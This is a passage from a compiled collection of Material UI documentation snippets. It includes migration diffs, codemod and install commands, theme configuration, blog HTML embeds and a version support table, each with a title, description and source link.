the `blog-description` class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q3-update.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<p class=\"blog-description\">% of download relative to react-dom</p>\n```\n\n----------------------------------------\n\nTITLE: Migrating Menu Item from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Menu Item components from Material-UI v0.x to v1.x with updated props and children usage.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n-import MenuItem from 'material-ui/MenuItem';\n+import MenuItem from '@material-ui/core/MenuItem';\n\n-<MenuItem primaryText=\"Profile\" />\n+<MenuItem>Profile</MenuItem>\n```\n\n----------------------------------------\n\nTITLE: Running Material-UI Styles Codemod Command\nDESCRIPTION: Command to execute the material-ui-styles codemod on a specified path. This transforms style imports from @material-ui/core/styles to @material-ui/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_94\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/material-ui-styles <path>\n```\n\n----------------------------------------\n\nTITLE: Migrating Subheader from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Subheader components from Material-UI v0.x to v1.x using the new ListSubheader component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n-import Subheader from 'material-ui/Subheader';\n+import ListSubheader from '@material-ui/core/ListSubheader';\n\n-<Subheader>Sub Heading</Subheader>\n+<ListSubheader>Sub Heading</ListSubheader>\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI and Emotion using Yarn (Bash)\nDESCRIPTION: This command installs the `@mui/material`, `@emotion/react`, and `@emotion/styled` packages using the Yarn package manager. `@emotion/react` and `@emotion/styled` are required peer dependencies for Material UI. This snippet is presented within a tabbed `codeblock` component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/codeblock.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n```bash yarn\nyarn add @mui/material @emotion/react @emotion/styled\n# `@emotion/react` and `@emotion/styled` are peer dependencies\n```\n```\n\n----------------------------------------\n\nTITLE: Running Styled Engine Provider Codemod Command\nDESCRIPTION: Command to execute the styled-engine-provider codemod on a specified path. This applies StyledEngineProvider to files containing ThemeProvider to support the new styling approach.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_109\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/styled-engine-provider <path>\n```\n\n----------------------------------------\n\nTITLE: Conditional Typing for RefObject Based on React Version - TypeScript\nDESCRIPTION: Defines a type `RefObject<T>` that toggles between `MutableRefObject` and `RefObject` based on the React version. It leverages the check on the signature of `useRef()` (which requires a parameter in React 19) to choose the correct type, ensuring that API consumers get accurate typing regardless of React version. Dependencies: TypeScript, React. Parameter: type parameter `T`. Outputs: a version-dependent ref object type. Limitation: Relies on TypeScript's structural type matching and the inner use of `useRef` signature.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/react-19-update.md#2025-04-22_snippet_4\n\nLANGUAGE: ts\nCODE:\n```\n// in React 19 useRef requires a parameter, so `() => any` will not match anymore\nexport type RefObject<T> = typeof React.useRef extends () => any\n  ? React.MutableRefObject<T>\n  : React.RefObject<T>;\n```\n\n----------------------------------------\n\nTITLE: Embedding After-State Avatar Loading Video using HTML\nDESCRIPTION: Embeds a video using the HTML <video> tag to demonstrate the improved loading experience of the Material-UI Avatar component after recent enhancements. The video is configured to autoplay, loop, be muted, and play inline.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/november-2019-update.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<video autoplay muted loop playsinline width=\"872\" height=\"154\">\n  <source src=\"/static/blog/november-2019-update/loading-avatar-after.mp4\" type=\"video/mp4\" />\n</video>\n```\n\n----------------------------------------\n\nTITLE: Alternative LoadingButton Import Migration for Material UI v6\nDESCRIPTION: Another import pattern update when switching from the Lab's LoadingButton to the standard Button component with loading functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_17\n\nLANGUAGE: diff\nCODE:\n```\n-import LoadingButton from '@mui/lab/LoadingButton';\n+import Button from '@mui/material/Button';\n```\n\n----------------------------------------\n\nTITLE: Image Embed in Markdown\nDESCRIPTION: Markdown syntax for embedding an image with alt text, source URL, width and height attributes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2022-tenerife-retreat.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n<img alt=\"Photo of the MUI team in front of the pool at our accommodations in Tenerife\" src=\"/static/blog/2022-tenerife-retreat/group-photo.jpeg\" width=\"1920\" height=\"1440\" />\n```\n\n----------------------------------------\n\nTITLE: Moving Component Overrides to components.styleOverrides\nDESCRIPTION: Diff showing the relocation of component style overrides from overrides to components.styleOverrides in the theme structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_19\n\nLANGUAGE: diff\nCODE:\n```\n import { createTheme } from '@mui/material/styles';\n\n const theme = createTheme({\n-  overrides: {\n-    MuiButton: {\n-      root: { padding: 0 },\n-    },\n-  },\n+  components: {\n+    MuiButton: {\n+      styleOverrides: {\n+        root: { padding: 0 },\n+      },\n+    },\n+  },\n });\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Project\nDESCRIPTION: Commands to install project dependencies and start the development server.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-styled-components-ts/README.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for Checkout Template in Material-UI\nDESCRIPTION: List of required dependencies for using the Checkout template in a Material-UI project. These packages need to be installed in the project for the template to function correctly.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/templates/checkout/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n@mui/material, @emotion/styled, @emotion/react\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Material UI Vite Example\nDESCRIPTION: Commands to install project dependencies and start the development server using npm.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-vite/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Adding Teide Image Description in HTML\nDESCRIPTION: This HTML snippet adds a description for the Teide hike image using a paragraph with a specific class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2022-tenerife-retreat.md#2025-04-22_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<p class=\"blog-description\">One final view of Teide glowing red in the sunset.</p>\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Next.js Material UI Example\nDESCRIPTION: Commands to install dependencies and start the development server for the Material UI Next.js Pages Router TypeScript example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs-pages-router-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Renaming Collapse Component Props in React\nDESCRIPTION: Renames Collapse's 'collapsedHeight' prop to 'collapsedSize' and updates the 'container' class to 'root'. This codemod aligns the Collapse component with the new API in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_75\n\nLANGUAGE: diff\nCODE:\n```\n-<Collapse collapsedHeight={40} />\n-<Collapse classes={{ container: 'collapse' }} />\n+<Collapse collapsedSize={40} />\n+<Collapse classes={{ root: 'collapse' }} />\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/collapse-rename-collapsedheight <path>\n```\n\n----------------------------------------\n\nTITLE: Running Codemod for Date Picker Migration in Bash\nDESCRIPTION: This command uses the MUI codemod tool to automatically migrate Date and Time Picker imports in a codebase from @mui/lab to @mui/x-date-pickers or @mui/x-date-pickers-pro.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/lab-date-pickers-to-mui-x.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/date-pickers-moved-to-x <path>\n```\n\n----------------------------------------\n\nTITLE: Markdown Survey Results Document\nDESCRIPTION: Markdown document containing survey results analysis, including frontmatter metadata and survey section breakdowns with image references.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-developer-survey-results.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n---\ntitle: 'The 2020 Material UI Developer Survey: here's what we discovered'\ndescription: Your feedback helps us to build better products. Here's what we learned about your needs in our annual survey.\ndate: 2020-06-27T00:00:00.000Z\nauthors: ['mnajdova', 'oliviertassinari', 'mbrookes']\ntags: ['Developer Survey']\nmanualCard: true\n---\n```\n\n----------------------------------------\n\nTITLE: Silver/Bronze Sponsors Display HTML\nDESCRIPTION: HTML code for embedding SVG object to display Silver and Bronze tier sponsors from OpenCollective.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/discover-more/backers/backers.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<p style=\"overflow: auto;\">\n  <object type=\"image/svg+xml\" data=\"https://opencollective.com/mui-org/tiers/silver-sponsor.svg?avatarHeight=70&width=600\" style=\"border-radius: 10px;\">Silver Sponsors</object>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Updating `withTheme` HOC Usage in JavaScript/JSX\nDESCRIPTION: Shows the required updates for using the `withTheme` HOC in MUI v5. The import path changes from '@mui/material/styles' to '@mui/styles'. Similar to `withStyles`, components using `withTheme` now need to be wrapped in a `ThemeProvider` from '@mui/material/styles' with a defined theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_36\n\nLANGUAGE: diff\nCODE:\n```\n-import { withTheme } from '@mui/material/styles';\n+import { withTheme } from '@mui/styles';\n+import { createTheme, ThemeProvider } from '@mui/material/styles';\n\n+const theme = createTheme();\n  const MyComponent = withTheme(({ theme }) => <div>{theme.direction}</div>);\n\n  function App(props) {\n-  return <MyComponent />;\n+  return <ThemeProvider theme={theme}><MyComponent {...props} /></ThemeProvider>;\n  }\n```\n\n----------------------------------------\n\nTITLE: Using Codemod for Grid Props Migration in v7\nDESCRIPTION: Command to run the codemod for automatically updating Grid props to the new format in Material UI v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@next v7.0.0/grid-props <path/to/folder>\n```\n\n----------------------------------------\n\nTITLE: Importing ListSubheader Component in React\nDESCRIPTION: Demonstrates how to import the ListSubheader component, which is used for creating labels for nested lists or sections within a list.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\nimport ListSubheader from '@mui/joy/ListSubheader';\n```\n\n----------------------------------------\n\nTITLE: Creating Success Callout Block - Markup\nDESCRIPTION: Shows how to add a success-styled callout in markdown documentation using the ':::success' container. This format draws attention to actionable tips or confirmations and supports list items, bold text, inline code, and links. Use in environments that support custom container directives for rendering styled blocks. No parameters; content is predetermined for use in static documentation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/callouts.md#2025-04-22_snippet_1\n\nLANGUAGE: markup\nCODE:\n```\n:::success\\nThis is a success callout.\\nIt says, \\\"Here's an actionable suggestion to help you succeed.\\\"\\n\\n- emphasised: **bold text**\\n- some code `<div/>`\\n- a [link](#link).\\n:::\n```\n\n----------------------------------------\n\nTITLE: Embedding Contributor Profile Images in Markdown - HTML Image Tag\nDESCRIPTION: This snippet shows how to include contributor headshot images within a Markdown document using an <img> tag. It sets the image source to a GitHub avatar URL, provides alternative text for accessibility, and applies inline styling to control width, margin, and border radius for a visually consistent profile presentation. Ensure external links are reliable and mindful of remote resource performance.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q1-update.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"https://avatars.githubusercontent.com/u/16926049\" alt=\"dmitriy\" style=\"max-width: 160px; margin: unset; margin-bottom: 24px; border-radius: 2px;\" />\n```\n\n----------------------------------------\n\nTITLE: Responsive GitHub Logo HTML Implementation\nDESCRIPTION: HTML code for displaying the GitHub logo with dark/light mode support using the picture element.\nSOURCE: https://github.com/mui/material-ui/blob/master/README.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://mui.com/static/readme/github-darkmode.svg\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"https://mui.com/static/readme/github-lightmode.svg\">\n  <img alt=\"GitHub logo\" src=\"https://mui.com/static/readme/github-lightmode.svg\" width=\"80\" height=\"43\">\n</picture>\n```\n\n----------------------------------------\n\nTITLE: Embedding Media Content in Markdown - HTML Paragraph with Link\nDESCRIPTION: This snippet adds an HTML paragraph element within Markdown to provide a styled description for the media above. It includes an anchor link referencing additional documentation, allowing for advanced formatting beyond standard Markdown. This approach is useful when more precise UI or rich in-line links are needed in documentation. Ensure the Markdown parser allows raw HTML and that external URLs are valid.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-q1-update.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<p class=\"blog-description\">useAutocomplete <a href=\"https://mui.com/material-ui/react-autocomplete/#useautocomplete\">hook</a> example, 4.5 kB gzipped.</p>\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Material UI Next.js Project\nDESCRIPTION: Commands to install the project dependencies and start the development server for the Material UI Next.js TypeScript example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Material UI Version Support Table\nDESCRIPTION: Markdown table showing Material UI versions and their support status, including release dates and level of support provided.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/support/support.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| Material UI version | Release    | Supported                                                          |\n| ------------------: | :--------- | :----------------------------------------------------------------- |\n|              ^7.0.0 | 2025-03-26 | ✅ Stable major (Continuous support)                               |\n|              ^6.0.0 | 2024-08-26 | ⚠️ Long-term support (Support for security issues and regressions) |\n|              ^5.0.0 | 2021-09-16 | ❌                                                                 |\n|              ^4.0.0 | 2019-06-23 | ❌                                                                 |\n|              ^3.0.0 | 2018-08-27 | ❌                                                                 |\n|              ^2.0.0 | /          | ❌                                                                 |\n|              ^1.0.0 | 2018-06-18 | ❌                                                                 |\n|             <=1.0.0 | 2014-10-05 | ❌                                                                 |\n```\n\n----------------------------------------\n\nTITLE: Input Props Codemod Command\nDESCRIPTION: Bash command to automatically transform deprecated Input component props using MUI's codemod utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_56\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/input-props <path>\n```\n\n----------------------------------------\n\nTITLE: Building and Publishing MUI Internal Docs Utils\nDESCRIPTION: Commands for building the project and publishing artifacts to npm registry. Requires pnpm package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages-internal/docs-utils/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npnpm build\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm release:publish\n```\n\n----------------------------------------\n\nTITLE: Running Material UI Next.js Project\nDESCRIPTION: Commands to install dependencies and start the development server for the Material UI Next.js example project.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs-ts-v4-v5-migration/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Specifying Version and Comparison in Markdown\nDESCRIPTION: Shows how version numbers and comparisons are formatted in the changelog using Markdown syntax. This is used to indicate the version being described and link to the diff with the previous version.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages-internal/scripts/typescript-to-proptypes/CHANGELOG.old.md#2025-04-22_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n## [2.0.1](https://github.com/merceyz/typescript-to-proptypes/compare/v2.0.0...v2.0.1) (2020-06-02)\n```\n\n----------------------------------------\n\nTITLE: Dynamic Styling with makeStyles and React Hooks (Material UI, JSX)\nDESCRIPTION: This React snippet demonstrates using the makeStyles hook API for dynamic, prop-driven styling in Material UI. The makeStyles function declares CSS rules that derive values from component props, supporting both property-based and function-based patterns. The example shows creating a useStyles hook that consumes props to generate classes, which are then applied to an element. Required dependencies include @mui/styles, and the main parameters are the props object (defining backgroundColor and color). The output is a div styled dynamically according to provided props. This pattern allows for high flexibility and theme-aware customization in React functional components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v4-is-out.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nconst useStyles = makeStyles({\\n  // style rule\\n  foo: (props) => ({\\n    backgroundColor: props.backgroundColor,\\n  }),\\n  bar: {\\n    // CSS property\\n    color: (props) => props.color,\\n  },\\n});\\n\\nfunction MyComponent() {\\n  // Simulated props for the purpose of the example\\n  const props = {\\n    backgroundColor: 'black',\\n    color: 'white',\\n  };\\n  // Pass the props as the first argument of useStyles()\\n  const classes = useStyles(props);\\n\\n  return <div className={`${classes.foo} ${classes.bar}`} />;\\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Inter Font using Package Managers\nDESCRIPTION: Commands for installing the Inter font package through Fontsource using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/installation/installation.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @fontsource/inter\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @fontsource/inter\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @fontsource/inter\n```\n\n----------------------------------------\n\nTITLE: Downloading and Extracting Material UI Vite Example\nDESCRIPTION: Commands to download the Material UI Vite.js example from GitHub and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-vite/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-vite\ncd material-ui-vite\n```\n\n----------------------------------------\n\nTITLE: Displaying Cat Collage Image in HTML\nDESCRIPTION: This HTML snippet displays an image of a cat collage from the MUI team retreat, with specified dimensions and lazy loading.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2022-tenerife-retreat.md#2025-04-22_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<img alt=\"Collage of several photos of the MUI team members cuddling with the neighborhood cat during our work sessions.\" src=\"/static/blog/2022-tenerife-retreat/cat-collage.jpeg\" width=\"1600\" height=\"1893\" loading=\"lazy\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring NPM Authentication Token\nDESCRIPTION: Example of the npm authentication token configuration in .npmrc file required for publishing releases.\nSOURCE: https://github.com/mui/material-ui/blob/master/scripts/README.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n//registry.npmjs.org/:_authToken=npm_000000000000000000000000000000000000\n```\n\n----------------------------------------\n\nTITLE: Illustrating Redundant Nesting with MUI FormControl and TextField (JSX)\nDESCRIPTION: This JSX snippet demonstrates a potential issue when composing Material UI components. Wrapping a `TextField` inside a `FormControl` is redundant because the `TextField` component inherently renders its own `FormControl` internally, potentially leading to unexpected layout or styling issues. The comment shows the equivalent, problematic nested structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/making-customizable-components.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<FormControl>\n  <TextField>\n</FormControl>\n\n// Equivalent to\n\n<FormControl>\n  <FormControl>\n    <InputLabel />\n    <Input />\n    <FormHelperText />\n  </FormControl>\n</FormControl>\n```\n\n----------------------------------------\n\nTITLE: Running Badge Props Codemod\nDESCRIPTION: Command to automatically migrate Badge component props using the MUI codemod tool.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest deprecations/badge-props <path>\n```\n\n----------------------------------------\n\nTITLE: VS Code Tailwind CSS IntelliSense Configuration\nDESCRIPTION: JSON configuration for VS Code settings to enable Tailwind CSS IntelliSense with Material UI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/tailwindcss/tailwindcss-v4.md#2025-04-22_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"tailwindCSS.experimental.classRegex\": [[\"className\\\\s*:\\\\s*['\\\"]([^'\\\"]*)['\\\"]\"]] \n}\n```\n\n----------------------------------------\n\nTITLE: Styling Table Headers in HTML\nDESCRIPTION: Inline CSS rule within a `<style>` tag to left-align text in table header (`th`) elements and apply a solid 3px bottom border. The `!important` flag ensures this style overrides potentially conflicting styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-developer-survey-results.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<!-- vale MUI.CorrectReferenceAllCases = NO -->\n\n<style>th { text-align: left; border-bottom: 3px solid !important; }</style>\n```\n\n----------------------------------------\n\nTITLE: Embedding Header Chip Component via Custom Syntax (JSX/Custom)\nDESCRIPTION: This snippet shows how a custom component, specifically '@mui/docs/ComponentLinkHeader', is embedded into the documentation using a special object-like syntax. This likely triggers the rendering of a predefined React component responsible for displaying header chips or links within the documentation page. It depends on the documentation generation system's ability to parse this syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/custom-components.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{{\"component\": \"@mui/docs/ComponentLinkHeader\"}}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Average Ratings\nDESCRIPTION: cURL command to fetch average feedback ratings for all pages from the API.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/feedback/README.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncurl <API-URL>/feedback/average\n```\n\n----------------------------------------\n\nTITLE: Updating Dialog Component Class Names in CSS\nDESCRIPTION: Shows the transformation of Dialog component CSS class names. The changes separate the scroll behavior class from the paper element class using child selectors.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_25\n\nLANGUAGE: diff\nCODE:\n```\n-.MuiDialog-root .MuiDialog-paperScrollBody\n+.MuiDialog-root .MuiDialog-scrollBody > .MuiDialog-paper\n-.MuiDialog-root .MuiDialog-paperScrollPaper\n+.MuiDialog-root .MuiDialog-scrollPaper > .MuiDialog-paper\n```\n\n----------------------------------------\n\nTITLE: Running Grid Migration Codemod\nDESCRIPTION: Commands to run the codemod for automatically migrating Grid component props to the new format.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/migrating-to-v6/migrating-to-v6.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/grid-v2-props <path/to/folder>\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/grid-v2-props <path/to/folder> --jscodeshift='--muiBreakpoints=mobile,desktop'\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Material UI Example\nDESCRIPTION: Commands to install dependencies and start the development server for the Material UI with Pigment CSS example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-pigment-css-vite-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Formatting Changelog Sections in Markdown\nDESCRIPTION: Demonstrates how different types of changes (features, bug fixes, etc.) are organized and formatted in the changelog using Markdown headers and lists.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages-internal/scripts/typescript-to-proptypes/CHANGELOG.old.md#2025-04-22_snippet_1\n\nLANGUAGE: Markdown\nCODE:\n```\n### Features\n\n- **generator:** add comment to proptype blocks ([2c5627e](https://github.com/merceyz/typescript-to-proptypes/commit/2c5627e))\n\n### Bug Fixes\n\n- **parser:** use doctrine to unwrap comments ([53a9d43](https://github.com/merceyz/typescript-to-proptypes/commit/53a9d43))\n```\n\n----------------------------------------\n\nTITLE: Removing Deprecated Typography Next Variants Flag\nDESCRIPTION: Diff showing the removal of the useNextVariants flag which is no longer needed in Material UI v4.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_8\n\nLANGUAGE: diff\nCODE:\n```\n typography: {\n-  useNextVariants: true,\n },\n```\n\n----------------------------------------\n\nTITLE: Running @mui/docs Synthetic Benchmark\nDESCRIPTION: Command to run the MUI documentation components benchmark with results for the MarkdownElement component, showing its performance in operations per second.\nSOURCE: https://github.com/mui/material-ui/blob/master/benchmark/server/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npnpm server:docs\n\nMarkdownElement x 3,941 ops/sec ±5.53% (185 runs sampled)\n```\n\n----------------------------------------\n\nTITLE: Cherry-picking Commits for Deployment\nDESCRIPTION: Git command to cherry-pick specific commits for documentation deployment.\nSOURCE: https://github.com/mui/material-ui/blob/master/scripts/README.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ngit cherry-pick <commit>\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Material UI CRA Example\nDESCRIPTION: Commands to install dependencies and start the development server for the Material UI Create React App example.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra-styled-components/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Base via pnpm in Bash\nDESCRIPTION: This command installs the MUI Base package using pnpm. It's an alternative method to add MUI Base to a project for developers who prefer using pnpm as their package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-base-ui.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/base\n```\n\n----------------------------------------\n\nTITLE: Rendering Material Free Templates Collection in React\nDESCRIPTION: This code snippet renders a React component that displays a collection of free Material UI templates. The component is likely defined in a separate file and imported here.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/templates/templates.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{\"component\": \"modules/components/MaterialFreeTemplatesCollection.js\"}\n```\n\n----------------------------------------\n\nTITLE: Blog Post Frontmatter in Markdown\nDESCRIPTION: YAML frontmatter defining metadata for the blog post including title, description, publication date, authors, and tags.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2022-tenerife-retreat.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n---\ntitle: MUI's company retreat in Tenerife: a recap\ndescription: Our internationally distributed startup gathered on a remote island to get to know each other better. Here's what happened!\ndate: 2022-07-28T00:00:00.000Z\nauthors: ['samuelsycamore']\ntags: ['Company']\nmanualCard: true\n---\n```\n\n----------------------------------------\n\nTITLE: Implementing Scoped CSS Reset with ScopedCssBaseline in Joy UI\nDESCRIPTION: This snippet shows how to apply CSS baseline styles only to specific children using the ScopedCssBaseline component. It demonstrates referencing the component for color scheme application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/css-baseline/css-baseline.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { CssVarsProvider } from '@mui/joy/styles';\nimport ScopedCssBaseline from '@mui/joy/ScopedCssBaseline';\nimport MyApp from './MyApp';\n\nexport default function MyApp() {\n  const [root, setRoot] = React.useState(null);\n  return (\n    {/* target the node to ScopedCssBaseline's div */}\n    <CssVarsProvider colorSchemeNode={root}>\n      {/* must be used under CssVarsProvider */}\n      <ScopedCssBaseline ref={(element) => setRoot(element)}>\n        {/* The rest of your application */}\n        <MyApp />\n      </ScopedCssBaseline>\n    </CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: RTL Plugin Installation Commands\nDESCRIPTION: Package installation commands for stylis-plugin-rtl using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/right-to-left/right-to-left.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnpm install stylis stylis-plugin-rtl\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add stylis stylis-plugin-rtl\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add stylis stylis-plugin-rtl\n```\n\n----------------------------------------\n\nTITLE: Building Workspace Packages\nDESCRIPTION: Command to build all packages in the workspace before starting the application.\nSOURCE: 